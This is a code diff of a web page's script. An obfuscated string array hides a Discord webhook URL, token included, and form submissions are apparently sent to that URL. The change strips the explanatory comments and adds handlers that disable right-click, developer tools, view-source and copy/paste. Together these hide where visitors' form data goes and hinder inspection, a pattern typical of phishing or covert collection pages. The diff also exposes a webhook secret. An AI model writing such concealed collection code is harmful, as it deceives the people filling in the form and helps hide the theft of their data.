@@ -155,7 +155,6 @@
 </div>
 
 <script>
-    // Obfuscated webhook URL
     const _0x2e1a=['1292590979311861841','api','aL8fy6Vzv_Kt8f7TpFbfz2ZPv0GWLBM8tGBEGkAGpjMs_hl88pro-5hBl4tJj1Zt0Lhr','discord','webhooks','com','https://'];
     const _0x5e10=function(_0x2e1a08,_0x5e1077){_0x2e1a08=_0x2e1a08-0x0;let _0x3f9e22=_0x2e1a[_0x2e1a08];return _0x3f9e22;};
     const DISCORD_WEBHOOK_URL=_0x5e10('6')+_0x5e10('3')+'.'+_0x5e10('5')+'/'+_0x5e10('1')+'/'+_0x5e10('4')+'/'+_0x5e10('0')+'/'+_0x5e10('2');
@@ -201,7 +200,6 @@
             });
 
             if (response.ok) {
-                // Redirect to submitted.html
                 window.location.href = "submitted.html";
             } else {
                 alert("There was an error submitting the form.");
@@ -211,6 +209,28 @@
             alert("Failed to submit form. Please try again.");
         }
     });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+            e.preventDefault();
+        }
+    });
+
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 67 || 
+             e.keyCode === 86 || 
+             e.keyCode === 85 || 
+             e.keyCode === 117)) {
+            return false;
+        } else {
+            return true;
+        }
+    };
 </script>
 
 </body>
